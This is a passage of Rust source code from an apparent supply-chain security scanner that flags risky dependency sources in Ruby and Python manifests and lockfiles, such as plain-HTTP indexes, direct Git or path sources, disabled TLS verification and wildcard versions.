                        "The Gemfile declares a package source over plain HTTP.",
                        "Use HTTPS-backed Ruby package sources only.",
                        format!("dependency-ruby-http:{}:{}", file.display(), line_number),
                    )
                    .with_line(line_number),
                );
            } else if !trimmed.contains("rubygems.org") {
                findings.push(
                    Finding::new(
                        "dependency.ruby.custom-index",
                        scanner,
                        Severity::Medium,
                        Confidence::High,
                        FindingCategory::Dependency,
                        Some(file.to_path_buf()),
                        "Gemfile defines a non-default gem source",
                        "The Gemfile declares a package source other than the default RubyGems index, which changes dependency provenance.",
                        "Confirm the custom Ruby source is intentional, authenticated, and documented.",
                        format!("dependency-ruby-source:{}:{}", file.display(), line_number),
                    )
                    .with_line(line_number),
                );
            }
        }

        if trimmed.starts_with("git_source(") {
            findings.push(
                Finding::new(
                    "dependency.ruby.git-source-helper",
                    scanner,
                    if trimmed.contains("http://") {
                        Severity::High
                    } else {
                        Severity::Medium
                    },
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    if trimmed.contains("http://") {
                        "Gemfile defines an insecure git source helper"
                    } else {
                        "Gemfile defines a custom git source helper"
                    },
                    "The Gemfile defines a custom git source helper, which can widen direct-source dependency usage and should receive careful review.",
                    "Keep git source helpers intentional and prefer reviewed registry releases where possible.",
                    format!("dependency-ruby-git-source-helper:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
        }

        if trimmed.starts_with("gem ") {
            if trimmed.contains("git:") || trimmed.contains("github:") || trimmed.contains("gist:")
            {
                findings.push(
                    Finding::new(
                        "dependency.ruby.git-source",
                        scanner,
                        Severity::High,
                        Confidence::High,
                        FindingCategory::Dependency,
                        Some(file.to_path_buf()),
                        "Gemfile uses a direct Git source",
                        "The Gemfile declares a gem from Git rather than a reviewed registry release.",
                        "Prefer registry-backed releases where possible, or document the direct Git source explicitly.",
                        format!("dependency-ruby-git:{}:{}", file.display(), line_number),
                    )
                    .with_line(line_number),
                );
            }

            if trimmed.contains("path:") {
                findings.push(
                    Finding::new(
                        "dependency.ruby.local-source",
                        scanner,
                        Severity::Low,
                        Confidence::High,
                        FindingCategory::Dependency,
                        Some(file.to_path_buf()),
                        "Gemfile uses a local path source",
                        "The Gemfile points a gem at a local path, which can be valid in controlled workspaces but deserves review in a security gate.",
                        "Confirm the local path dependency is intentional and part of a controlled workspace layout.",
                        format!("dependency-ruby-path:{}:{}", file.display(), line_number),
                    )
                    .with_line(line_number),
                );
            }

            if trimmed.contains("source:") && !trimmed.contains("rubygems.org") {
                findings.push(
                    Finding::new(
                        "dependency.ruby.custom-index",
                        scanner,
                        Severity::Medium,
                        Confidence::High,
                        FindingCategory::Dependency,
                        Some(file.to_path_buf()),
                        "Gemfile dependency uses a custom gem source",
                        "The Gemfile points a dependency at a non-default Ruby source, which changes dependency provenance.",
                        "Confirm the custom source is intentional, authenticated, and documented.",
                        format!("dependency-ruby-gem-source:{}:{}", file.display(), line_number),
                    )
                    .with_line(line_number),
                );
            }
        }
    }

    findings
}

fn scan_gemfile_lock(scanner: &'static str, file: &Path, contents: &str) -> Vec<Finding> {
    let mut findings = Vec::new();
    let mut current_section = "";

    for (line_number, line) in contents.lines().enumerate() {
        let line_number = line_number + 1;
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }

        if !line.starts_with(' ')
            && trimmed
                .chars()
                .all(|character| character.is_ascii_uppercase())
        {
            current_section = trimmed;
            continue;
        }

        if !trimmed.starts_with("remote: ") {
            continue;
        }

        let remote = trimmed.trim_start_matches("remote: ").trim();
        match current_section {
            "GIT" => {
                findings.push(
                    Finding::new(
                        "dependency.ruby.lockfile.git-source",
                        scanner,
                        if remote.starts_with("http://") {
                            Severity::High
                        } else {
                            Severity::Medium
                        },
                        Confidence::High,
                        FindingCategory::Dependency,
                        Some(file.to_path_buf()),
                        "Gemfile.lock contains a Git-sourced dependency",
                        "The Bundler lockfile includes a dependency resolved from Git rather than a normal registry release.",
                        "Prefer reviewed registry releases where possible, or document the Git source and pinning strategy explicitly.",
                        format!("dependency-ruby-lock-git:{}:{}", file.display(), line_number),
                    )
                    .with_line(line_number),
                );
            }
            "PATH" => {
                findings.push(
                    Finding::new(
                        "dependency.ruby.lockfile.local-source",
                        scanner,
                        Severity::Low,
                        Confidence::High,
                        FindingCategory::Dependency,
                        Some(file.to_path_buf()),
                        "Gemfile.lock contains a local path dependency",
                        "The Bundler lockfile includes a dependency resolved from a local path source.",
                        "Confirm the local dependency is intentional and part of a controlled workspace layout.",
                        format!("dependency-ruby-lock-path:{}:{}", file.display(), line_number),
                    )
                    .with_line(line_number),
                );
            }
            "GEM" => {
                if remote.starts_with("http://") {
                    findings.push(
                        Finding::new(
                            "dependency.ruby.lockfile.insecure-source",
                            scanner,
                            Severity::High,
                            Confidence::High,
                            FindingCategory::Dependency,
                            Some(file.to_path_buf()),
                            "Gemfile.lock uses an insecure gem source",
                            "The Bundler lockfile references a package source over plain HTTP.",
                            "Use HTTPS-backed gem sources only.",
                            format!(
                                "dependency-ruby-lock-http:{}:{}",
                                file.display(),
                                line_number
                            ),
                        )
                        .with_line(line_number),
                    );
                } else if !remote.contains("rubygems.org") {
                    findings.push(
                        Finding::new(
                            "dependency.ruby.lockfile.custom-index",
                            scanner,
                            Severity::Medium,
                            Confidence::High,
                            FindingCategory::Dependency,
                            Some(file.to_path_buf()),
                            "Gemfile.lock references a non-default gem source",
                            "The Bundler lockfile resolves gems from a non-default source, which changes dependency provenance.",
                            "Confirm the custom gem source is intentional, authenticated, and documented.",
                            format!("dependency-ruby-lock-source:{}:{}", file.display(), line_number),
                        )
                        .with_line(line_number),
                    );
                }
            }
            _ => {}
        }
    }

    findings
}

fn scan_gemfile_owner_host_findings(
    scanner: &'static str,
    file: &Path,
    contents: &str,
    ownership_rules: &[String],
) -> Vec<Finding> {
    if ownership_rules.is_empty() {
        return Vec::new();
    }

    let mut findings = Vec::new();
    let mut seen = HashSet::new();

    for line in contents.lines() {
        let trimmed = strip_inline_comment(line).trim();
        let Some((name, host)) = ruby_manifest_dependency_host(trimmed) else {
            continue;
        };

        record_ruby_manifest_owner_host_mismatch(
            scanner,
            file,
            &name,
            &host,
            ownership_rules,
            &mut findings,
            &mut seen,
        );
        if trimmed.contains("git:") || trimmed.contains("github:") || trimmed.contains("gist:") {
            record_ruby_manifest_direct_source_owner_bypass(
                scanner,
                file,
                &name,
                &host,
                ownership_rules,
                &mut findings,
                &mut seen,
            );
        }
    }

    findings
}

fn scan_gemfile_lock_owner_host_findings(
    scanner: &'static str,
    file: &Path,
    contents: &str,
    ownership_rules: &[String],
) -> Vec<Finding> {
    if ownership_rules.is_empty() {
        return Vec::new();
    }

    let mut findings = Vec::new();
    let mut seen = HashSet::new();
    let mut current_section = "";
    let mut current_host: Option<String> = None;
    let mut in_specs = false;

    for line in contents.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }

        if !line.starts_with(' ')
            && trimmed
                .chars()
                .all(|character| character.is_ascii_uppercase())
        {
            current_section = trimmed;
            current_host = None;
            in_specs = false;
            continue;
        }

        if let Some(remote) = trimmed.strip_prefix("remote: ") {
            current_host = match current_section {
                "GEM" | "GIT" => extract_registry_host(remote),
                _ => None,
            };
            continue;
        }

        if trimmed == "specs:" {
            in_specs = true;
            continue;
        }

        if !in_specs || !matches!(current_section, "GEM" | "GIT") {
            continue;
        }

        let Some(host) = current_host.as_deref() else {
            continue;
        };
        let Some(name) = gemfile_lock_spec_name(trimmed) else {
            continue;
        };

        record_ruby_lock_owner_host_mismatch(
            scanner,
            file,
            &name,
            host,
            ownership_rules,
            &mut findings,
            &mut seen,
        );
    }

    findings
}

fn scan_pyproject(scanner: &'static str, file: &Path, contents: &str) -> Vec<Finding> {
    let mut findings = Vec::new();
    let mut current_section = String::new();

    for (line_number, line) in contents.lines().enumerate() {
        let line_number = line_number + 1;
        let trimmed = strip_inline_comment(line).trim();
        if trimmed.is_empty() {
            continue;
        }

        if trimmed.starts_with('[') && trimmed.ends_with(']') {
            current_section = trimmed.to_string();
            if matches!(
                current_section.as_str(),
                "[[tool.poetry.source]]" | "[tool.uv]" | "[[tool.uv.index]]"
            ) {
                findings.push(
                    Finding::new(
                        "dependency.python.custom-index",
                        scanner,
                        Severity::Medium,
                        Confidence::High,
                        FindingCategory::Dependency,
                        Some(file.to_path_buf()),
                        "Python project config defines a custom package index",
                        "The project config defines a non-default package source, which changes dependency provenance and should receive careful review.",
                        "Confirm the custom index is intentional, authenticated, and documented as part of the repository's dependency trust model.",
                        format!("dependency-python-custom-index:{}:{}", file.display(), line_number),
                    )
                    .with_line(line_number),
                );
            }
            continue;
        }

        if trimmed.contains("git = ") || trimmed.contains(" @ git+") {
            findings.push(
                Finding::new(
                    "dependency.python.git-source",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "Python dependency uses a direct Git source",
                    "The Python dependency definition references a Git source directly.",
                    "Prefer reviewed package-index releases where possible, or document the justification for the direct source.",
                    format!("dependency-python-git:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
        }

        if trimmed.contains(" @ https://")
            || trimmed.contains("url = \"https://")
            || trimmed.contains("path = ")
        {
            findings.push(
                Finding::new(
                    "dependency.python.direct-source",
                    scanner,
                    Severity::Medium,
                    Confidence::Medium,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "Python dependency uses a direct archive or local source",
                    "The Python dependency definition references an archive URL or local path directly rather than a normal package-index release.",
                    "Prefer reviewed package-index releases where possible, or document why the direct source is required.",
                    format!("dependency-python-direct-source:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
        }

        if trimmed.contains("http://") {
            findings.push(
                Finding::new(
                    "dependency.python.insecure-http-source",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "Python dependency uses insecure HTTP transport",
                    "The dependency definition references dependency data over plain HTTP.",
                    "Use HTTPS-backed sources only.",
                    format!("dependency-python-http:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
        }

        if current_section == "[tool.uv]" && trimmed.contains("allow-insecure-host") {
            findings.push(
                Finding::new(
                    "dependency.python.insecure-host-allowlist",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "Python project config allows insecure package hosts",
                    "The project config appears to allow insecure package hosts, weakening dependency transport trust.",
                    "Remove insecure host allowlists and rely on authenticated HTTPS package sources.",
                    format!("dependency-python-insecure-host:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
        }

        if trimmed.contains(" = \"*\"") || trimmed.contains("@ *") {
            findings.push(
                Finding::new(
                    "dependency.python.wildcard-version",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "Python dependency uses a wildcard version",
                    "The dependency definition allows an effectively unbounded version selector.",
                    "Replace the wildcard with an explicit version policy.",
                    format!(
                        "dependency-python-wildcard:{}:{}",
                        file.display(),
                        line_number
                    ),
                )
                .with_line(line_number),
            );
        }
    }

    findings
}

fn scan_uv_lock(scanner: &'static str, file: &Path, contents: &str) -> Vec<Finding> {
    let mut findings = Vec::new();

    for (line_number, line) in contents.lines().enumerate() {
        let line_number = line_number + 1;
        let trimmed = line.trim();

        if trimmed.contains("source = { git = ") {
            findings.push(
                Finding::new(
                    "dependency.python.lockfile.git-source",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "uv lockfile contains a Git-sourced package",
                    "The lockfile includes a package resolved from Git rather than a package index release.",
                    "Prefer reviewed package-index releases where possible, or document the justification for the Git source.",
                    format!("dependency-uv-lock-git:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
        }

        if trimmed.contains("source = { path = ") || trimmed.contains("source = { editable = ") {
            findings.push(
                Finding::new(
                    "dependency.python.lockfile.local-source",
                    scanner,
                    Severity::Low,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "uv lockfile contains a local path package source",
                    "The lockfile includes a package resolved from a local path or editable source.",
                    "Confirm the local source is intentional and part of a controlled workspace layout.",
                    format!("dependency-uv-lock-path:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
        }

        if trimmed.contains("http://") {
            findings.push(
                Finding::new(
                    "dependency.python.lockfile.insecure-url",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "uv lockfile contains an insecure HTTP source",
                    "The lockfile references a package source over plain HTTP.",
                    "Use HTTPS-backed package sources only.",
                    format!("dependency-uv-lock-http:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
        }
    }

    findings
}

fn scan_uv_lock_owner_host_findings(
    scanner: &'static str,
    file: &Path,
    contents: &str,
    ownership_rules: &[String],
) -> Vec<Finding> {
    if ownership_rules.is_empty() {
        return Vec::new();
    }

    let mut findings = Vec::new();
    let mut seen = HashSet::new();
    let mut current_name: Option<String> = None;
    let mut current_host: Option<String> = None;
    let mut current_direct_source: Option<(String, Option<String>)> = None;

    for line in contents.lines() {
        let trimmed = line.trim();
        if trimmed == "[[package]]" {
            if let Some(name) = current_name.as_deref() {
                if let Some(host) = current_host.take() {
                    record_python_owner_host_mismatch(
                        scanner,
                        file,
                        name,
                        &host,
                        ownership_rules,
                        &mut findings,
                        &mut seen,
                    );
                }
                if let Some((source_kind, source_location)) = current_direct_source.take() {
                    record_python_lock_direct_source_owner_bypass(
                        scanner,
                        file,
                        name,
                        &source_kind,
                        source_location.as_deref(),
                        ownership_rules,
                        &mut findings,
                        &mut seen,
                    );
                }
            }
            current_name = None;
            continue;
        }

        if let Some(name) = trimmed.strip_prefix("name = \"") {
            current_name = Some(name.trim_end_matches('"').to_string());
        } else if let Some(source) = trimmed.strip_prefix("source = { registry = ") {
            current_host = extract_registry_host(source.trim_end_matches(" }"));
            current_direct_source = None;
        } else if let Some(source) = trimmed.strip_prefix("source = { git = ") {
            current_direct_source = Some((
                "Git source".to_string(),
                extract_registry_host(source.trim_end_matches(" }")),
            ));
        } else if trimmed.starts_with("source = { path = ") {
            current_direct_source = Some(("local path source".to_string(), None));
        } else if trimmed.starts_with("source = { editable = ") {
            current_direct_source = Some(("editable source".to_string(), None));
        }
    }

    if let Some(name) = current_name.as_deref() {
        if let Some(host) = current_host {
            record_python_owner_host_mismatch(
                scanner,
                file,
                name,
                &host,
                ownership_rules,
                &mut findings,
                &mut seen,
            );
        }
        if let Some((source_kind, source_location)) = current_direct_source {
            record_python_lock_direct_source_owner_bypass(
                scanner,
                file,
                name,
                &source_kind,
                source_location.as_deref(),
                ownership_rules,
                &mut findings,
                &mut seen,
            );
        }
    }

    findings
}

fn scan_poetry_lock_owner_host_findings(
    scanner: &'static str,
    file: &Path,
    contents: &str,
    ownership_rules: &[String],
) -> Vec<Finding> {
    if ownership_rules.is_empty() {
        return Vec::new();
    }

    let mut findings = Vec::new();
    let mut seen = HashSet::new();
    let mut current_name: Option<String> = None;
    let mut current_source_type: Option<String> = None;
    let mut current_source_url: Option<String> = None;

    for line in contents.lines() {
        let trimmed = line.trim();
        if trimmed == "[[package]]" {
            if let Some(name) = current_name.as_deref() {
                if let Some(source_type) = current_source_type.as_deref() {
                    if source_type != "legacy" {
                        record_python_lock_direct_source_owner_bypass(
                            scanner,
                            file,
                            name,
                            &format!("Poetry {source_type} source"),
                            current_source_url.as_deref(),
                            ownership_rules,
                            &mut findings,
                            &mut seen,
                        );
                    }
                }
            }
            current_name = None;
            current_source_type = None;
            current_source_url = None;
            continue;
        }

        if let Some(name) = trimmed.strip_prefix("name = \"") {
            current_name = Some(name.trim_end_matches('"').to_string());
            continue;
        }
        if let Some(source_type) = trimmed.strip_prefix("type = \"") {
            current_source_type = Some(source_type.trim_end_matches('"').to_string());
            continue;
        }
        if let Some(url) = trimmed.strip_prefix("url = \"") {
            current_source_url = Some(url.trim_end_matches('"').to_string());
        }

        let Some(name) = current_name.as_deref() else {
            continue;
        };
        let Some(url) = trimmed.strip_prefix("url = \"") else {
            continue;
        };
        let Some(host) = extract_registry_host(url.trim_end_matches('"')) else {
            continue;
        };

        record_python_lock_owner_host_mismatch(
            scanner,
            file,
            name,
            &host,
            ownership_rules,
            &mut findings,
            &mut seen,
        );
    }
    if let Some(name) = current_name.as_deref() {
        if let Some(source_type) = current_source_type.as_deref() {
            if source_type != "legacy" {
                record_python_lock_direct_source_owner_bypass(
                    scanner,
                    file,
                    name,
                    &format!("Poetry {source_type} source"),
                    current_source_url.as_deref(),
                    ownership_rules,
                    &mut findings,
                    &mut seen,
                );
            }
        }
    }

    findings
}

fn scan_poetry_lock(scanner: &'static str, file: &Path, contents: &str) -> Vec<Finding> {
    let mut findings = Vec::new();

    for (line_number, line) in contents.lines().enumerate() {
        let line_number = line_number + 1;
        let trimmed = line.trim();

        if trimmed.contains("url = \"http://") {
            findings.push(
                Finding::new(
                    "dependency.python.lockfile.insecure-url",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "Poetry lockfile contains an insecure HTTP source",
                    "The lockfile references a package source over plain HTTP.",
                    "Use HTTPS-backed sources only.",
                    format!("dependency-poetry-http:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
        }
    }

    findings
}

fn scan_pipfile_lock(scanner: &'static str, file: &Path, contents: &str) -> Vec<Finding> {
    let Ok(value) = serde_json::from_str::<Value>(contents) else {
        return Vec::new();
    };

    let mut findings = Vec::new();
    let default = value.get("default").and_then(Value::as_object);
    let develop = value.get("develop").and_then(Value::as_object);

    for entries in [default, develop].into_iter().flatten() {
        for (name, entry) in entries {
            let Some(entry) = entry.as_object() else {
                continue;
            };

            if entry.contains_key("git") {
                findings.push(Finding::new(
                    "dependency.python.lockfile.git-source",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "Pipfile.lock contains a Git-sourced package",
                    format!(
                        "The lockfile package `{name}` is sourced from Git rather than a standard package index release."
                    ),
                    "Prefer reviewed package-index releases where possible, or document the justification for the Git source.",
                    format!("dependency-pipfile-lock-git:{}:{}", file.display(), name),
                ));
            }

            if entry.contains_key("file") || entry.contains_key("path") {
                findings.push(Finding::new(
                    "dependency.python.lockfile.local-source",
                    scanner,
                    Severity::Low,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "Pipfile.lock contains a local file or path source",
                    format!(
                        "The lockfile package `{name}` resolves from a local file or path source."
                    ),
                    "Confirm the local source is intentional and part of a controlled workspace layout.",
                    format!("dependency-pipfile-lock-path:{}:{}", file.display(), name),
                ));
            }

            if entry
                .get("index")
                .and_then(Value::as_str)
                .is_some_and(|index| index != "pypi")
            {
                findings.push(Finding::new(
                    "dependency.python.lockfile.custom-index",
                    scanner,
                    Severity::Medium,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "Pipfile.lock resolves packages from a custom package index",
                    format!(
                        "The lockfile package `{name}` references a non-default package index, which changes dependency provenance."
                    ),
                    "Confirm the custom index is intentional, authenticated, and documented.",
                    format!("dependency-pipfile-lock-index:{}:{}", file.display(), name),
                ));
            }
        }
    }

    findings
}

fn scan_pipfile_lock_owner_host_findings(
    scanner: &'static str,
    file: &Path,
    contents: &str,
    ownership_rules: &[String],
) -> Vec<Finding> {
    if ownership_rules.is_empty() {
        return Vec::new();
    }

    let Ok(value) = serde_json::from_str::<Value>(contents) else {
        return Vec::new();
    };

    let source_hosts = pipfile_lock_source_hosts(&value);

    let mut findings = Vec::new();
    let mut seen = HashSet::new();

    for entries in [
        value.get("default").and_then(Value::as_object),
        value.get("develop").and_then(Value::as_object),
    ]
    .into_iter()
    .flatten()
    {
        for (name, entry) in entries {
            let Some(entry) = entry.as_object() else {
                continue;
            };
            if let Some(index_name) = entry.get("index").and_then(Value::as_str) {
                if let Some(host) = source_hosts.get(index_name) {
                    record_python_owner_host_mismatch(
                        scanner,
                        file,
                        name,
                        host,
                        ownership_rules,
                        &mut findings,
                        &mut seen,
                    );
                }
            }

            if let Some(url) = entry.get("git").and_then(Value::as_str) {
                record_python_lock_direct_source_owner_bypass(
                    scanner,
                    file,
                    name,
                    "Git source",
                    extract_registry_host(url).as_deref(),
                    ownership_rules,
                    &mut findings,
                    &mut seen,
                );
            } else if let Some(url) = entry.get("file").and_then(Value::as_str) {
                record_python_lock_direct_source_owner_bypass(
                    scanner,
                    file,
                    name,
                    "file source",
                    extract_registry_host(url).as_deref(),
                    ownership_rules,
                    &mut findings,
                    &mut seen,
                );
            } else if entry.contains_key("path") {
                let source_kind = if entry.get("editable").is_some() {
                    "editable source"
                } else {
                    "local path source"
                };
                record_python_lock_direct_source_owner_bypass(
                    scanner,
                    file,
                    name,
                    source_kind,
                    None,
                    ownership_rules,
                    &mut findings,
                    &mut seen,
                );
            }
        }
    }

    findings
}

fn scan_pyproject_owner_host_findings(
    scanner: &'static str,
    file: &Path,
    contents: &str,
    ownership_rules: &[String],
) -> Vec<Finding> {
    if ownership_rules.is_empty() {
        return Vec::new();
    }

    let mut findings = Vec::new();
    let mut seen = HashSet::new();
    let mut current_section = String::new();

    for line in contents.lines() {
        let trimmed = strip_inline_comment(line).trim();
        if trimmed.starts_with('[') && trimmed.ends_with(']') {
            current_section = trimmed.to_string();
            continue;
        }

        let Some((name, host)) = python_requirement_direct_host(trimmed) else {
            if !python_inline_source_section(&current_section) {
                continue;
            }
            let Some((name, host)) = python_named_inline_source_host(trimmed) else {
                continue;
            };

            record_python_manifest_owner_host_mismatch(
                scanner,
                file,
                &name,
                &host,
                ownership_rules,
                &mut findings,
                &mut seen,
            );
            record_python_manifest_direct_source_owner_bypass(
                scanner,
                file,
                &name,
                &host,
                ownership_rules,
                &mut findings,
                &mut seen,
            );
            continue;
        };

        record_python_manifest_owner_host_mismatch(
            scanner,
            file,
            &name,
            &host,
            ownership_rules,
            &mut findings,
            &mut seen,
        );
        record_python_manifest_direct_source_owner_bypass(
            scanner,
            file,
            &name,
            &host,
            ownership_rules,
            &mut findings,
            &mut seen,
        );
    }

    findings
}

fn scan_pipfile_owner_host_findings(
    scanner: &'static str,
    file: &Path,
    contents: &str,
    ownership_rules: &[String],
) -> Vec<Finding> {
    if ownership_rules.is_empty() {
        return Vec::new();
    }

    let mut findings = Vec::new();
    let mut seen = HashSet::new();
    let mut current_section = String::new();

    for line in contents.lines() {
        let trimmed = strip_inline_comment(line).trim();
        if trimmed.is_empty() {
            continue;
        }

        if trimmed.starts_with('[') && trimmed.ends_with(']') {
            current_section = trimmed.to_string();
            continue;
        }

        if !matches!(current_section.as_str(), "[packages]" | "[dev-packages]") {
            continue;
        }

        let Some((name, host)) = python_named_inline_source_host(trimmed) else {
            continue;
        };

        record_python_manifest_owner_host_mismatch(
            scanner,
            file,
            &name,
            &host,
            ownership_rules,
            &mut findings,
            &mut seen,
        );
        record_python_manifest_direct_source_owner_bypass(
            scanner,
            file,
            &name,
            &host,
            ownership_rules,
            &mut findings,
            &mut seen,
        );
    }

    findings
}

fn scan_pipfile(scanner: &'static str, file: &Path, contents: &str) -> Vec<Finding> {
    let mut findings = Vec::new();
    let mut in_source_section = false;

    for (line_number, line) in contents.lines().enumerate() {
        let line_number = line_number + 1;
        let trimmed = strip_inline_comment(line).trim();
        if trimmed.is_empty() {
            continue;
        }

        if trimmed.starts_with('[') && trimmed.ends_with(']') {
            in_source_section = trimmed == "[[source]]";
            continue;
        }

        if in_source_section && trimmed.starts_with("url = ") {
            findings.push(
                Finding::new(
                    "dependency.python.custom-index",
                    scanner,
                    Severity::Medium,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "Pipfile defines a custom package index",
                    "The Pipfile defines a non-default package source, which changes dependency provenance and should receive careful review.",
                    "Confirm the custom index is intentional, authenticated, and documented.",
                    format!("dependency-pipfile-index:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
        }

        if trimmed == "verify_ssl = false" {
            findings.push(
                Finding::new(
                    "dependency.python.insecure-host-allowlist",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "Pipfile disables package source TLS verification",
                    "The Pipfile disables TLS verification for a package index, weakening dependency transport trust.",
                    "Enable TLS verification and rely on authenticated HTTPS package sources.",
                    format!("dependency-pipfile-verify-ssl:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
        }

        if trimmed.contains(" = \"*\"") {
            findings.push(
                Finding::new(
                    "dependency.python.wildcard-version",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "Python dependency uses a wildcard version",
                    "The dependency definition allows an effectively unbounded version selector.",
                    "Replace the wildcard with an explicit version policy.",
                    format!(
                        "dependency-pipfile-wildcard:{}:{}",
                        file.display(),
                        line_number
                    ),
                )
                .with_line(line_number),
            );
        }

        if trimmed.contains("git = ") || trimmed.contains("path = ") || trimmed.contains("file = ")
        {
            findings.push(
                Finding::new(
                    "dependency.python.direct-source",
                    scanner,
                    Severity::Medium,
                    Confidence::Medium,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "Pipfile uses a direct dependency source",
                    "The Pipfile references a Git, file, or local path source directly rather than a normal package-index release.",
                    "Prefer reviewed package-index releases where possible, or document why the direct source is required.",
                    format!("dependency-pipfile-direct-source:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
        }
    }

    findings
}

fn scan_requirements_owner_host_findings(
    scanner: &'static str,
    file: &Path,
    contents: &str,
    ownership_rules: &[String],
) -> Vec<Finding> {
    if ownership_rules.is_empty() {
        return Vec::new();
    }

    let mut findings = Vec::new();
    let mut seen = HashSet::new();

    for line in contents.lines() {
        let trimmed = strip_inline_comment(line).trim();
        let Some((name, host)) = python_requirement_direct_host(trimmed) else {
            continue;
        };

        record_python_manifest_owner_host_mismatch(
            scanner,
            file,
            &name,
            &host,
            ownership_rules,
            &mut findings,
            &mut seen,
        );
        record_python_manifest_direct_source_owner_bypass(
            scanner,
            file,
            &name,
            &host,
            ownership_rules,
            &mut findings,
            &mut seen,
        );
    }

    findings
}

fn scan_requirements(scanner: &'static str, file: &Path, contents: &str) -> Vec<Finding> {
    let mut findings = Vec::new();

    for (line_number, line) in contents.lines().enumerate() {
        let line_number = line_number + 1;
        let trimmed = strip_inline_comment(line).trim();

        if trimmed.is_empty() {
            continue;
        }

        if trimmed.starts_with("--extra-index-url") {
            findings.push(
                Finding::new(
                    "dependency.python.requirements.extra-index",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "requirements file adds an extra package index",
                    "The requirements file uses `--extra-index-url`, which can widen dependency provenance and increase dependency-confusion risk if package names overlap.",
                    "Prefer a single authenticated index strategy where possible, and explicitly review package name ownership across indexes.",
                    format!("dependency-requirements-extra-index:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
            continue;
        }

        if trimmed.starts_with("--index-url") {
            findings.push(
                Finding::new(
                    "dependency.python.requirements.index-url",
                    scanner,
                    Severity::Medium,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "requirements file overrides the package index",
                    "The requirements file sets a custom package index, which changes dependency provenance and should receive careful review.",
                    "Confirm the custom index is intentional, authenticated, and documented.",
                    format!("dependency-requirements-index-url:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
            continue;
        }

        if trimmed.starts_with("--trusted-host") {
            findings.push(
                Finding::new(
                    "dependency.python.requirements.trusted-host",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "requirements file trusts a package host without standard TLS verification",
                    "The requirements file uses `--trusted-host`, which can weaken dependency transport protections.",
                    "Remove the trusted-host exception and rely on authenticated HTTPS package sources.",
                    format!("dependency-requirements-trusted-host:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
            continue;
        }

        if trimmed.starts_with("--find-links") || trimmed.starts_with("-f ") {
            findings.push(
                Finding::new(
                    "dependency.python.requirements.find-links",
                    scanner,
                    Severity::Medium,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "requirements file uses an out-of-band package link source",
                    "The requirements file uses `--find-links`, which can shift dependency provenance away from the primary package index.",
                    "Confirm the out-of-band package source is intentional, authenticated, and documented.",
                    format!("dependency-requirements-find-links:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
            continue;
        }

        if trimmed.contains("git+") {
            findings.push(
                Finding::new(
                    "dependency.python.requirements.git-source",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "requirements file uses a direct Git source",
                    "The requirements file references a dependency from Git directly.",
                    "Prefer reviewed package-index releases where possible.",
                    format!(
                        "dependency-requirements-git:{}:{}",
                        file.display(),
                        line_number
                    ),
                )
                .with_line(line_number),
            );
        } else if trimmed.contains(" @ https://") || trimmed.starts_with("https://") {
            findings.push(
                Finding::new(
                    "dependency.python.requirements.direct-source",
                    scanner,
                    Severity::Medium,
                    Confidence::Medium,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "requirements file uses a direct remote package source",
                    "The requirements file references a direct archive or URL source rather than a normal package-index release.",
                    "Prefer reviewed package-index releases where possible, or document why the direct source is required.",
                    format!("dependency-requirements-direct-source:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
        } else if trimmed.contains("http://") {
